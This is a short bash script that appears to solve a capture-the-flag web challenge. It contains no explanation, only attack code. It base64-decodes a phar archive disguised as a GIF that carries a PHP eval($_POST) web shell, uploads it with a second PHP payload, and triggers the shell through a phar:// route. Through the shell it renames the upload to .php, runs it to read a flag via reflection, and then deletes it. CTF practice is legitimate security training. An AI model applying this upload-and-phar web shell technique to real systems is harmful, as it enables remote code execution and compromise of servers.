#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/04/21, 17:45


sandbox=xxxxx

echo 'PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQo1AAAAAQAAABEAAAABAAAAAAACAAAATjsFAAAAdi5waHAWAAAAM6G8XBYAAADJa/hgpAEAAAAAAAA8P3BocCBldmFsKCRfUE9TVFs5XSk747HfaP4fpyX4Dt8EqnIKe3lyAfICAAAAR0JNQg==' | base64 -D > exp.gif

curl -s -q "http://$sandbox.changame.ichunqiu.com/?route=app/Up10aD" \
    -F file=@exp.gif

echo 'PD9waHAKbmFtZXNwYWNlIGludGVyZXN0aW5nOwpmdW5jdGlvbiBzaGExKCR2YXIpIHsKCSRjbGFzcyA9IG5ldyBcUmVmbGVjdGlvbkNsYXNzKCdpbnRlcmVzdGluZ1xGbGFnU0RLJyk7CgkkbWcgPSAkY2xhc3MtPmdldE1ldGhvZCgnZ2V0SGFzaCcpOwoJJG1nLT5zZXRBY2Nlc3NpYmxlKHRydWUpOwoJJHNkayA9ICRjbGFzcy0+bmV3SW5zdGFuY2UoKTsKCXJldHVybiAkbWctPmludm9rZSgkc2RrKTsKfQokc2RrID0gbmV3IEZsYWdTREsoKTsKZWNobyAkc2RrLT52ZXJpZnkoMSk7' | base64 -D > s.gif

curl -s -q "http://$sandbox.changame.ichunqiu.com/?route=app/Up10aD" \
    -F file=@s.gif

rm exp.gif s.gif

curl -s -q "http://$sandbox.changame.ichunqiu.com/?route=phar://./upload/exp.gif.gif/v" \
    -d '9=rename("/var/www/html/upload/s.gif.gif","/var/www/html/upload/s.php");'

curl -s "http://$sandbox.changame.ichunqiu.com/upload/s.php" --output -

curl -s -q "http://$sandbox.changame.ichunqiu.com/?route=phar://./upload/exp.gif.gif/v" \
    -d '9=unlink("/var/www/html/upload/s.php");'